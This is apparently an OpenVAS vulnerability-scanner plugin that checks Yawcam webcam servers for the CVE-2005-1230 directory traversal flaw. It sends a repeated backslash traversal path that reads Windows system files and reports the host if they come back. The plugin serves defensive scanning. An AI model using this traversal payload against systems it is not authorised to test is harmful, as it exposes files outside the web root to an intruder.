# SPDX-FileCopyrightText: 2005 David Maciejak
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

#  Ref: Donato Ferrante <fdonato at autistici.org>

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.18176");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2005-1230");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Yawcam Directory Traversal");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2005 David Maciejak");
  script_dependencies("find_service.nasl", "httpver.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 8081);
  script_mandatory_keys("Host/runs_windows");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://marc.info/?l=bugtraq&m=111410564915961&w=2");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/13295");

  script_tag(name:"solution", value:"Upgrade to Yawcam 0.2.6 or later.");

  script_tag(name:"summary", value:"The installed version of Yawcam is vulnerable to a directory traversal flaw.");

  script_tag(name:"impact", value:"By exploiting this issue, an attacker may be able to gain
  access to material outside of the web root.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

port = http_get_port( default:8081 );

buf = http_get_cache( item:"/local.html", port:port );
if( ! buf ) exit( 0 );
if( "<title>Yawcam</title>" >!< buf ) exit( 0 );

files = traversal_files( "Windows" );

foreach pattern( keys( files ) ) {

  file = files[pattern];
  file = str_replace( string:file, find:"/", replace:"\\" );
  url = "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\" + file;

  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 0 );
